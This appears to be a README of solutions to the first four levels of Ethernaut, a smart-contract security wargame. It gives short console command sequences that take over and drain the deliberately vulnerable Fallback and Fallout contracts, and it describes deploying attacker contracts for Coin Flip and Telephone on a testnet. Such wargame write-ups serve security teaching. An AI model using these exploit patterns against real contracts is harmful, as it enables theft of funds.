# Ethernaut - Solutions

## 1. Fallback

```
await contract.contribute({ value: toWei("0.0001") });
await contract.sendTransaction({ value: toWei("0.0001") });
await contract.withdraw();
```


## 2. Fallout

```
await contract.Fal1out({ value: toWei("0.0001") });
await contract.collectAllocations();
```


## 3. Coin Flip

Compile [CoinFlipAttack.sol](./solutions/CoinFlipAttack.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Do not forget to specify the level `instance` address when deploying the attacker contract (constructor).  
Afterwards, just call the `callFlipWithCorrectGuess()` function 10 times.


## 4. Telephone

Compile [TelephoneProxy.sol](./solutions/TelephoneProxy.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
Afterwards, just call the `giveMeTelephoneOwnership(address _telephoneContract)` function with the level `instance` address as first argument.
